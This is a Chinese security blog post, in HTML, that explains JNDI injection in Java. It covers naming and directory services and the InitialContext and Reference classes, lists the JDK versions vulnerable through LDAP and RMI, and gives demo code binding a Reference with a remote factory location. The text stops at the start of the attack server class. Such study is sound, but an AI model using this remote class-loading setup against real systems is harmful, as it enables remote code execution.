@@ -1,0 +1,594 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="UTF-8" />
+        <title>JNDI注入 | 雲流のLowest World</title>
+        <meta name="author" content="C1oudfL0w0" />
+        <meta name="description" content="" />
+        <meta name="keywords" content="" />
+        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+        <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+        <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入jQuery-->
+<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<!-- 引入不蒜子-->
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>    
+        <script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+    <meta name="generator" content="Hexo 6.3.0"></head>
+    <body>
+        <!--flag{never_g0nna g1ve_you up}-->
+        
+        <!-- 页面点击特效 -->
+        <script type = "text/javascript" src = "/blog/js/love-click.js"></script>
+
+        <!-- 浏览器标题 -->
+         <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+         
+        <!--动态背景-->
+        <script type="text/javascript"
+        color="0,0,255" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+        <!--文章目录-->
+        
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI%E6%A6%82%E8%BF%B0"><span class="toc-number">2.</span> <span class="toc-text">JNDI概述</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Naming-Service-%E5%91%BD%E5%90%8D%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.1.</span> <span class="toc-text">Naming Service 命名服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Directory-Service-%E7%9B%AE%E5%BD%95%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">Directory Service 目录服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#API"><span class="toc-number">2.3.</span> <span class="toc-text">API</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI%E7%BB%93%E6%9E%84"><span class="toc-number">3.</span> <span class="toc-text">JNDI结构</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#InitialContext%E7%B1%BB"><span class="toc-number">3.1.</span> <span class="toc-text">InitialContext类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference%E7%B1%BB"><span class="toc-number">3.2.</span> <span class="toc-text">Reference类</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">JNDI注入</span></a></li></ol>
+    </div>
+  
+        
+        <!--返回顶部-->
+        <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+            <a title="返回顶部">↑</a>
+            </div>
+        <script src="/blog/js/totop.js"></script>
+
+        <div id="layout">
+            <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+            </transition>
+            <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>JNDI注入</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/1/23
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/Web/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Web
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/Java/" style="color: #ffa2c4">Java</a>
+            </span>
+            
+        </span>
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">2.1k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">8分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>期末考结束了，java这块耽搁太久了</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/%E4%BB%8ERMI%E5%88%B0JNDI%E6%B3%A8%E5%85%A5/">https://boogipop.com/2023/03/02/%E4%BB%8ERMI%E5%88%B0JNDI%E6%B3%A8%E5%85%A5/</a></p>
+<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1611/">https://tttang.com/archive/1611/</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12277">https://xz.aliyun.com/t/12277</a></p>
+<span id="more"></span>
+
+<hr>
+<h1 id="JNDI概述"><a href="#JNDI概述" class="headerlink" title="JNDI概述"></a>JNDI概述</h1><p>JNDI（Java Naming and Directory Interface，Java命名和目录接口）是为Java应用程序提供<strong>命名和目录访问服务的API</strong>，允许客户端通过名称发现和查找数据、对象，用于提供基于配置的动态调用</p>
+<p>即通过调用 JNDI 的 API 可以定位资源和其他程序对象，访问系统的命名服务（Naming Service）和目录服务（Directory Service）</p>
+<h2 id="Naming-Service-命名服务"><a href="#Naming-Service-命名服务" class="headerlink" title="Naming Service 命名服务"></a>Naming Service 命名服务</h2><p>命名服务将名称和对象进行<strong>关联</strong>，提供通过名称找到对象的操作</p>
+<p>例如：DNS 系统将计算机名和 IP 地址进行关联；文件系统将文件名和文件句柄进行关联</p>
+<p>名称系统中一些重要的概念：</p>
+<ul>
+<li><p><code>Bindings</code>：表示一个名称和对应对象的绑定关系，</p>
+<p>例：在文件系统中文件名绑定到对应的文件，在 DNS 中域名绑定到对应的 IP。</p>
+</li>
+<li><p><code>Context</code>：上下文，一个上下文中对应着一组名称到对象的绑定关系，我们可以在指定上下文中查找名称对应的对象。</p>
+<p>例：在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文 （subcontext）</p>
+</li>
+<li><p><code>References</code>: 在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以<strong>引用</strong>的形式进行存储</p>
+<p>可以理解为 <code>C/C++</code> 中的指针，引用中包含了获取实际对象所需的信息，甚至对象的实际状态。</p>
+<p>例：文件系统中实际根据名称打开的文件是一个整数 <code>fd</code> (<code>file descriptor</code>)，这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。</p>
+</li>
+</ul>
+<hr>
+<h2 id="Directory-Service-目录服务"><a href="#Directory-Service-目录服务" class="headerlink" title="Directory Service 目录服务"></a>Directory Service 目录服务</h2><p>目录服务是命名服务的扩展，除了提供名称和对象的关联，还允许<strong>对象具有属性</strong>。</p>
+<p>目录服务中的对象称之为<strong>目录对象</strong>。</p>
+<p>提供创建、添加、删除目录对象以及修改目录对象属性等操作。由此，我们不仅可以根据名称去查找(<code>lookup</code>)对象(并获取其对应属性)，还可以根据属性值去搜索(<code>search</code>)对象。</p>
+<p>例：</p>
+<p><code>NIS</code>：<code>Network Information Service，Solaris</code> 系统中用于查找系统相关信息的目录服务；</p>
+<p><code>Active Directory</code>：为 <code>Windows</code> 域网络设计，包含多个目录服务，比如域名服务、证书服务等；</p>
+<p>其他基于 <code>LDAP</code> 协议实现的目录服务</p>
+<hr>
+<h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><p>JNDI 架构上主要包含两个部分，即 Java 的应用层接口和 SPI ，如图：</p>
+<p><img src="/blog/2024/01/23/JNDI%E6%B3%A8%E5%85%A5/image-20240123172310525.png" alt="image-20240123172310525"></p>
+<p>JNDI分为四种服务：</p>
+<table>
+<thead>
+<tr>
+<th>协议</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>LDAP</td>
+<td>轻量级目录访问协议，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容</td>
+</tr>
+<tr>
+<td>RMI</td>
+<td>JAVA 远程方法协议，该协议用于远程调用应用程序编程接口，使客户机上运行的程序可以调用远程服务器上的对象</td>
+</tr>
+<tr>
+<td>DNS</td>
+<td>域名服务</td>
+</tr>
+<tr>
+<td>CORBA</td>
+<td>公共对象请求代理体系结构</td>
+</tr>
+</tbody></table>
+<p>RMI我们前面已经学过了它的反序列化隐患，而其余的几种也存在安全隐患</p>
+<hr>
+<h1 id="JNDI结构"><a href="#JNDI结构" class="headerlink" title="JNDI结构"></a>JNDI结构</h1><p>JNDI 的功能实现：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">javax<span class="token punctuation">.</span>naming：主要用于命名操作<span class="token punctuation">,</span>包含了访问目录服务所需的类和接口，比如 <span class="token class-name">Context</span>、<span class="token class-name">Bindings</span>、<span class="token class-name">References</span>、lookup 等。
+javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>directory：主要用于目录操作，它定义了<span class="token class-name">DirContext</span>接口和<span class="token class-name">InitialDir</span><span class="token operator">-</span> <span class="token class-name">Context</span>类；
+javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>event：在命名目录服务器中请求事件通知；
+javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>ldap：提供<span class="token constant">LDAP</span>支持；
+javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过<span class="token constant">JNDI</span>可以访问相关服务。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="InitialContext类"><a href="#InitialContext类" class="headerlink" title="InitialContext类"></a>InitialContext类</h2><p>构造方法：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 构建一个初始上下文。</span>
+<span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
+<span class="token comment">// 构造一个初始上下文，并选择不初始化它。</span>
+<span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> lazy<span class="token punctuation">)</span> 
+<span class="token comment">// 使用提供的环境构建初始上下文。</span>
+<span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token punctuation">></span></span> environment<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>常用方法：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 将名称绑定到对象。 </span>
+<span class="token function">bind</span><span class="token punctuation">(</span><span class="token class-name">Name</span> name<span class="token punctuation">,</span> <span class="token class-name">Object</span> obj<span class="token punctuation">)</span> 
+<span class="token comment">// 枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。</span>
+<span class="token function">list</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> 
+<span class="token comment">// 检索命名对象。</span>
+<span class="token function">lookup</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span>  
+<span class="token comment">// 将名称绑定到对象，覆盖任何现有绑定。</span>
+<span class="token function">rebind</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Object</span> obj<span class="token punctuation">)</span> 
+<span class="token comment">// 取消绑定命名对象。</span>
+<span class="token function">unbind</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>demo：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">InitialContext</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> jndi <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">String</span> uri <span class="token operator">=</span> <span class="token string">"rmi://127.0.0.1:1099/work"</span><span class="token punctuation">;</span>
+        <span class="token comment">// 在这JDK里面给的解释是构建初始上下文，其实通俗点来讲就是获取初始目录环境。</span>
+        <span class="token class-name">InitialContext</span> initialContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        initialContext<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>uri<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h2 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h2><p>该类表示对在命名&#x2F;目录系统外部找到的对象的<strong>引用</strong></p>
+<p>构造方法：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 为类名为“className”的对象构造一个新的引用。</span>
+<span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token class-name">String</span> className<span class="token punctuation">)</span> 
+<span class="token comment">// 为类名为“className”的对象和地址构造一个新引用。 </span>
+<span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token class-name">String</span> className<span class="token punctuation">,</span> <span class="token class-name">RefAddr</span> addr<span class="token punctuation">)</span> 
+<span class="token comment">// 为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。 </span>
+<span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token class-name">String</span> className<span class="token punctuation">,</span> <span class="token class-name">RefAddr</span> addr<span class="token punctuation">,</span> <span class="token class-name">String</span> factory<span class="token punctuation">,</span> <span class="token class-name">String</span> factoryLocation<span class="token punctuation">)</span> 
+<span class="token comment">// 为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。  </span>
+<span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token class-name">String</span> className<span class="token punctuation">,</span> <span class="token class-name">String</span> factory<span class="token punctuation">,</span> <span class="token class-name">String</span> factoryLocation<span class="token punctuation">)</span>
+
+<span class="token comment">/*
+参数：
+className 远程加载时所使用的类名
+factory  加载的class中需要实例化类的名称
+factoryLocation  提供classes数据的地址可以是file/ftp/http协议
+*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>常用方法：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 将地址添加到索引posn的地址列表中。</span>
+<span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> posn<span class="token punctuation">,</span> <span class="token class-name">RefAddr</span> addr<span class="token punctuation">)</span> 
+<span class="token comment">// 将地址添加到地址列表的末尾。 </span>
+<span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">RefAddr</span> addr<span class="token punctuation">)</span> 
+<span class="token comment">// 从此引用中删除所有地址。  </span>
+<span class="token keyword">void</span> <span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
+<span class="token comment">// 检索索引posn上的地址。 </span>
+<span class="token class-name">RefAddr</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">int</span> posn<span class="token punctuation">)</span> 
+<span class="token comment">// 检索地址类型为“addrType”的第一个地址。  </span>
+<span class="token class-name">RefAddr</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">String</span> addrType<span class="token punctuation">)</span> 
+<span class="token comment">// 检索本参考文献中地址的列举。 </span>
+<span class="token class-name">Enumeration</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">RefAddr</span><span class="token punctuation">></span></span> <span class="token function">getAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
+<span class="token comment">// 检索引用引用的对象的类名。 </span>
+<span class="token class-name">String</span> <span class="token function">getClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
+<span class="token comment">// 检索此引用引用的对象的工厂位置。  </span>
+<span class="token class-name">String</span> <span class="token function">getFactoryClassLocation</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
+<span class="token comment">// 检索此引用引用对象的工厂的类名。  </span>
+<span class="token class-name">String</span> <span class="token function">getFactoryClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
+<span class="token comment">// 从地址列表中删除索引posn上的地址。    </span>
+<span class="token class-name">Object</span> <span class="token function">remove</span><span class="token punctuation">(</span><span class="token keyword">int</span> posn<span class="token punctuation">)</span> 
+<span class="token comment">// 检索此引用中的地址数。 </span>
+<span class="token keyword">int</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
+<span class="token comment">// 生成此引用的字符串表示形式。</span>
+<span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>demo：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Reference</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">AlreadyBoundException</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> jndi <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span><span class="token punctuation">,</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">AlreadyBoundException</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">String</span> url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:8080"</span><span class="token punctuation">;</span> 
+        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Reference</span> reference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>reference<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"aa"</span><span class="token punctuation">,</span>referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><p>版本：</p>
+<table>
+<thead>
+<tr>
+<th>协议</th>
+<th>JDK6</th>
+<th>JDK7</th>
+<th>JDK8</th>
+<th>JDK11</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>LADP</td>
+<td>6u211以下</td>
+<td>7u201以下</td>
+<td>8u191以下</td>
+<td>11.0.1以下</td>
+</tr>
+<tr>
+<td>RMI</td>
+<td>6u132以下</td>
+<td>7u122以下</td>
+<td>8u113以下</td>
+<td>无</td>
+</tr>
+</tbody></table>
+<p>以一个 RMI 服务为例子，先创建一个 RMI 服务，然后再创建 JNDI 的服务端和客户端，文件结构就是之前文章中的 RMI 基础上再加上 JNDI 服务端和客户端</p>
+<p>服务端：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span></span><span class="token constant">JNDI</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Reference</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JNDIRMIServer</span> <span class="token punctuation">&#123;</span>
